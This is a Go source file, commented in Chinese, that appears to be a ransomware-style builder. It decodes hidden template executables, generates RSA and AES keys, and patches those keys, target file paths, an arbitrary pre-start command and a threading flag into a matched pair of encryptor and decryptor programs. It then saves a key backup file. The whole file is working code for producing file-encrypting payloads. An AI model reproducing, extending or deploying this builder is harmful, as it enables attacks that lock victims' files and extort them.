package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
)

var FILE_RANDSTRING string

func init_model() error {
	if !isPathExists("./Encryptor.exe") {
		ENCRYPTOR_MODEL, err := base64.StdEncoding.DecodeString(ENCRYPTOR_BASE64_MODEL)
		if err != nil {
			return fmt.Errorf("解码失败:", err)
		}
		writeFile("./Encryptor.exe", ENCRYPTOR_MODEL)
	}
	if !isPathExists("./Decryptor.exe") {
		DECRYPTOR_MODEL, err := base64.StdEncoding.DecodeString(DECRYPTOR_BASE64_MODEL)
		if err != nil {
			return fmt.Errorf("解码失败:", err)
		}
		writeFile("./Decryptor.exe", DECRYPTOR_MODEL)
	}
	SetHiddenAttribute("./Decryptor.exe")
	SetHiddenAttribute("./Encryptor.exe")
	return nil
}

func del_model() error {
	os.Remove("./Decryptor.exe")
	os.Remove("./Encryptor.exe")
	return nil
}

func generate(path_slice []string, aes_min int, cmd string, is_multi_thread bool) (string, string, string, error) {
	err := init_model()
	if err != nil {
		return "", "", "", err
	}
	//生成新的 公钥和私钥
	publicKey, privateKey, err := getRSAPublicPrivate()
	if err != nil {
		return "", "", "", err
	}
	//生成新的 AES 密钥
	aesKey, err := getAES(24)
	if err != nil {
		return "", "", "", err
	}
	fmt.Println(publicKey, privateKey, aesKey)

	FILE_RANDSTRING, err = getAES(8)
	if err != nil {
		return "", "", "", err
	}

	encryptorFilePath, err := generateEncryptor(publicKey, aesKey, path_slice, cmd, aes_min, is_multi_thread)
	if err != nil {
		return "", "", "", err
	}
	decryptorFilePath, err := generateDecryptor(privateKey, aesKey, path_slice)
	if err != nil {
		return "", "", "", err
	}
	backUpFilePath, err := generateBackUpFile(publicKey, privateKey, aesKey, path_slice)
	if err != nil {
		return "", "", "", err
	}
	del_model()
	return encryptorFilePath, decryptorFilePath, backUpFilePath, nil
}

func generateEncryptor(publicKey string, aesKey string, path_slice []string, cmd string, aes_min int, is_multi_thread bool) (string, error) {
	//一个新的 Encryptor
	ENCRYPTOR_GENERATED, err := base64.StdEncoding.DecodeString(ENCRYPTOR_BASE64_MODEL)
	if err != nil {
		return "", err
	}
	//修改 Encryptor 的公钥
	Symbol_Encryptor_PUBKEY, err := findSymbol("./Encryptor.exe", "PUBKEY")
	if err != nil {
		return "", err
	}
	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_PUBKEY, str_decode2byte(publicKey))
	//修改 Encryptor 的 AES 密钥
	Symbol_Encryptor_AESKEY, err := findSymbol("./Encryptor.exe", "AESKEY")
	if err != nil {
		return "", err
	}
	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_AESKEY, str_decode2byte(aesKey))
	//修改 Encryptor 的 CMD
	Symbol_Encryptor_CMD, err := findSymbol("./Encryptor.exe", "COMMAND_BEFORE_START")
	if err != nil {
		return "", err
	}
	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_CMD, str_decode2byte(cmd))
	//修改 Encryptor 的 ASMETRI_MAX
	Symbol_Encryptor_ASMETRI_MAX, err := findSymbol("./Encryptor.exe", "ASMETRI_MAX")
	if err != nil {
		return "", err
	}
	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_ASMETRI_MAX, str_decode2byte(strconv.Itoa(aes_min*1024)))
	//修改是否多线程
	if is_multi_thread {
		Symbol_Encryptor_IS_MULTI_THREAD, err := findSymbol("./Encryptor.exe", "IS_MULTI_THREAD")
		if err != nil {
			return "", nil
		}
		ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_IS_MULTI_THREAD, str_decode2byte("true"))
	}
	//修改 Encryptor 的 PATHS
	Symbol_Encryptor_PATHS, err := findSymbol("./Encryptor.exe", "PATHS")
	if err != nil {
		return "", err
	}
	Symbol_Encryptor_PATHS += 2048
	for _, path := range path_slice {
		ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_PATHS, str_decode2byte(path))
		Symbol_Encryptor_PATHS += 2048
	}
	//生成文件名称，保存文件
	newFilePath := fmt.Sprintf("./Encryptor_%s.exe", FILE_RANDSTRING)
	fmt.Println(Symbol_Encryptor_PUBKEY, Symbol_Encryptor_AESKEY, Symbol_Encryptor_PATHS, Symbol_Encryptor_CMD, Symbol_Encryptor_ASMETRI_MAX)
	writeFile(newFilePath, ENCRYPTOR_GENERATED)
	return newFilePath, nil
}

func generateDecryptor(privateKey string, aesKey string, path_slice []string) (string, error) {
	//一个新的 Decryptor
	DECRYPTOR_GENERATED, err := base64.StdEncoding.DecodeString(DECRYPTOR_BASE64_MODEL)
	if err != nil {
		return "", err
	}
	//修改 Decryptor 的私钥
	Symbol_Decryptor_PRIKEY, err := findSymbol("./Decryptor.exe", "PRIKEY")
	if err != nil {
		return "", err
	}
	DECRYPTOR_GENERATED = modifyData(DECRYPTOR_GENERATED, Symbol_Decryptor_PRIKEY, str_decode2byte(privateKey))
	//修改 Decryptor 的 AES 密钥
	Symbol_Decryptor_AESKEY, err := findSymbol("./Decryptor.exe", "AESKEY")
	if err != nil {
		return "", err
	}
	DECRYPTOR_GENERATED = modifyData(DECRYPTOR_GENERATED, Symbol_Decryptor_AESKEY, str_decode2byte(aesKey))
	//修改 Decryptor 的 PATHS
	Symbol_Decryptor_PATHS, err := findSymbol("./Decryptor.exe", "PATHS")
	if err != nil {
		return "", err
	}
	Symbol_Decryptor_PATHS += 2048
	for _, path := range path_slice {
		DECRYPTOR_GENERATED = modifyData(DECRYPTOR_GENERATED, Symbol_Decryptor_PATHS, str_decode2byte(path))
		Symbol_Decryptor_PATHS += 2048
	}

	//生成文件名称，保存文件
	newFilePath := fmt.Sprintf("./Decryptor_%s.exe", FILE_RANDSTRING)
	fmt.Println(Symbol_Decryptor_PRIKEY, Symbol_Decryptor_AESKEY, Symbol_Decryptor_PATHS)
	writeFile(newFilePath, DECRYPTOR_GENERATED)
	return newFilePath, nil
}

type BackUpStruct struct {
	PUBLIC_KEY  string
	PRIVATE_KEY string
	AES_KEY     string
	PATH_SLICE  []string
}

func generateBackUpFile(publicKey string, privateKey string, aesKey string, path_slice []string) (string, error) {
	fileContent := BackUpStruct{
		PUBLIC_KEY:  publicKey,
		PRIVATE_KEY: privateKey,
		AES_KEY:     aesKey,
		PATH_SLICE:  path_slice,
	}

	//生成文件名称，保存文件
	fileJson, err := json.Marshal(fileContent)
	if err != nil {
		return "", err
	}
	newFilePath := fmt.Sprintf("./BackUpFile_%s(请勿删除，作为紧急恢复的备份).txt", FILE_RANDSTRING)
	writeFile(newFilePath, fileJson)
	return newFilePath, nil
}
